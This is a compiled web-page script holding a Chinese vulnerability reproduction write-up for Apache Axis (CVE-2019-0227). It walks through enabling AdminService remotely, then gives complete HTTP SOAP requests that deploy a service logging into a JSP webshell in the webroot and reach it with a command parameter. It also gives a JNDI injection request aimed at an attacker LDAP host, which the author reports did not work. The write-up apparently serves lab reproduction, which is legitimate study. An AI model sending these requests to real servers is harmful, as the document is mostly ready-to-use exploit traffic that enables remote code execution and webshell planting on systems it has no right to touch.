assets/Apache Axis 远程代码执行漏洞 CVE-2019-0227.html-d82017e5.js

import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as n,b as e,d as o,e as i}from"./app-58e4a7d6.js";const v={},r=i('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Axis 服务被用于部署各种接口服务。其中，AdminService 接口允许管理员远程访问管理服务，相关配置在 <code>/axis/WEB-INF/server-config.wsdd</code>(部署应用后产生)，其中<code>enableRemoteAdmin</code>默认为<code>false</code>，只允许本地管理。</p><p>若将<code>enableRemoteAdmin</code>设置为<code>true</code>，则可以执行 JNDI 注入，执行任意代码或反弹 Shell。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>',4),c={href:"http://mirror.navercorp.com/apache/axis/axis/java/1.4/axis-bin-1_4.tar.gz",target:"_blank",rel:"noopener noreferrer"},u=i(`<p>修改环境变量：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim ~/.profile
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>export AXIS_HOME=/usr/tomcat/apache-tomcat-8.5.90/webapps/axis
export AXIS_LIB=$AXIS_HOME/WEB-INF/lib
export AXISCLASSPATH=$AXIS_LIB/axis.jar:$AXIS_LIB/commons-discovery-0.2.jar:$AXIS_LIB/commons-logging-1.0.4.jar:$AXIS_LIB/jaxrpc.jar:$AXIS_LIB/saaj.jar:$AXIS_LIB/log4j-1.2.8.jar:$AXIS_LIB/xml-apis.jar:$AXIS_LIB/xercesImpl.jar:$AXIS_LIB/wsdl4j-1.5.1.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>刷新环境变量：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>source ~/.profile
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>开启RemoteAdmin服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim webapps/axis/WEB-INF/deploy.wsdd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;
    xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;
  &lt;service name=&quot;AdminService&quot; provider=&quot;java:MSG&quot;&gt;
    &lt;parameter name=&quot;className&quot; value=&quot;org.apache.axis.utils.Admin&quot;/&gt;
    &lt;parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
    &lt;parameter name=&quot;enableRemoteAdmin&quot; value=&quot;true&quot;/&gt;
  &lt;/service&gt;
&lt;/deployment&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>刷新配置：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -cp $AXISCLASSPATH org.apache.axis.client.AdminClient deploy.wsdd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="randomservice-报错getshell" tabindex="-1"><a class="header-anchor" href="#randomservice-报错getshell" aria-hidden="true">#</a> RandomService 报错getshell</h3><p>注册服务，指定日志目录为shell路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/axis/shell.jsp&quot; /&gt;  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: &quot;&quot;
Content-Length: 1059
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;ns1:deployment
  xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;
  xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;
  xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
  &lt;ns1:service name=&quot;RandomService&quot; provider=&quot;java:RPC&quot;&gt;
    &lt;requestFlow&gt;
      &lt;handler type=&quot;RandomLog&quot;/&gt;
    &lt;/requestFlow&gt;
    &lt;ns1:parameter name=&quot;className&quot; value=&quot;java.util.Random&quot;/&gt;
    &lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
  &lt;/ns1:service&gt;
  &lt;handler name=&quot;RandomLog&quot; type=&quot;java:org.apache.axis.handlers.LogHandler&quot; &gt;
    &lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/axis/shell.jsp&quot; /&gt;   
    &lt;parameter name=&quot;LogHandler.writeToConsole&quot; value=&quot;false&quot; /&gt; 
  &lt;/handler&gt;
&lt;/ns1:deployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630164154570.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>请求RandomService，利用报错将错误日志写入到shell文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/RandomService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: &quot;&quot;
Content-Length: 874
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
        &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
        &lt;soapenv:Body&gt;
        &lt;api:main
        soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
            &lt;api:in0&gt;&lt;![CDATA[
&lt;%@page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;%                                                                                                                                                                                                                                                                                             %&gt;
]]&gt;
            &lt;/api:in0&gt;
        &lt;/api:main&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630164243555.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>shell 地址：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>view-source:http://your-ip:8080/axis/shell.jsp?c=pwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630164400748.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里的 shell 写入路径 LogHandler.fileName 为 <code>../webapps/axis/shell.jsp</code>，实际遇到的目标启动路径可能不同，需要根据实际对写入的路径做相应的变动。</p><p>卸载服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 458

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
  &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
      &lt;service name=&quot;randomService&quot;/&gt;
      &lt;handler name=&quot;RandomLog&quot;/&gt;
      &lt;service name=&quot;jndiService&quot;/&gt;
    &lt;/undeployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="adminservice-jndi注入" tabindex="-1"><a class="header-anchor" href="#adminservice-jndi注入" aria-hidden="true">#</a> AdminService JNDI注入</h3><p>注册服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 746

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;ns1:deployment xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;
      &lt;ns1:service name=&quot;testService&quot; provider=&quot;java:RPC&quot;&gt;
        &lt;ns1:parameter name=&quot;className&quot; value=&quot;org.apache.axis.client.ServiceFactory&quot;/&gt;
        &lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
      &lt;/ns1:service&gt;
    &lt;/ns1:deployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630163319405.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问创建的testService进行jndi注入：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/testService HTTP/1.1
Host: your-ip:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/axis/servlet/AxisServlet
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.9,zh-CN;q=0.8
Connection: close
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length: 791

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:buil=&quot;http://build.antlr&quot;&gt;
  &lt;soapenv:Header/&gt;
  &lt;soapenv:Body&gt;
    &lt;buil:getService soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
      &lt;environment xmlns:apachesoap=&quot;http://xml.apache.org/xml-soap&quot; xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xsi:type=&quot;apachesoap:Map&quot;&gt;
        &lt;item&gt;
          &lt;key xsi:type=&quot;soapenc:string&quot;&gt;jndiName&lt;/key&gt;
          &lt;value xsi:type=&quot;soapenc:string&quot;&gt;ldap://your-ip:1389/dlmaty&lt;/value&gt;
        &lt;/item&gt;
      &lt;/environment&gt;
    &lt;/buil:getService&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里 JNDI 注入<strong>不成功</strong>，报错 <code>java.lang.ClassCastException: javax.naming.Reference cannot be cast to org.apache.axis.client.Service</code>。</p><p>可能是复现的环境采用需要1.8.0_102之前的环境。（待测）</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230630163750630.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>卸载服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 458

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
&lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
 &lt;service name=&quot;testService&quot;/&gt;
&lt;/undeployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,36);function m(p,g){const t=s("ExternalLinkIcon");return l(),d("div",null,[r,n("p",null,[e("下载 "),n("a",c,[e("axis bin"),o(t)]),e(" 解压，将 webapps 下 axis 文件夹复制到 tomcat 环境下 webapps 目录下。")]),u])}const h=a(v,[["render",m],["__file","Apache Axis 远程代码执行漏洞 CVE-2019-0227.html.vue"]]);export{h as default};
